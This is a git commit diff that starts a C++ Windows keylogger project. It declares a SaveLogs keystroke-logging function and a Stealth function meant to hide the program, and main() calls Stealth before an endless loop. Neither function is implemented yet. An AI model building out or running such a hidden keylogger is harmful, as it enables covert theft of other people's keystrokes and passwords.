3e80bb16b28eef11b859699b7fd3dd3bbffba562
Christopherical <chris_dixon1989@hotmail.com>
2020-10-27 18:02:21 +0000

    started project

--- keyLogger/main.cpp
+++ keyLogger/main.cpp
@@ -1,11 +1,18 @@
 #include <iostream>
+#include <windows.h>
+#include <winuser.h>
 
 using namespace std;
 
+int SaveLogs(int key_stroke, char* file);
+void Stealth();  //Declare stealth function to make you keylogger hidden.
+
 int main() {
 
-	cout << "Hi!";
-	cout << "test";
+	Stealth();       // This will call the stealth function.
+	char i;          //Here we declare ‘i’ from the type ‘char’
+
+	while(1){}
 
 	return 0;
 }
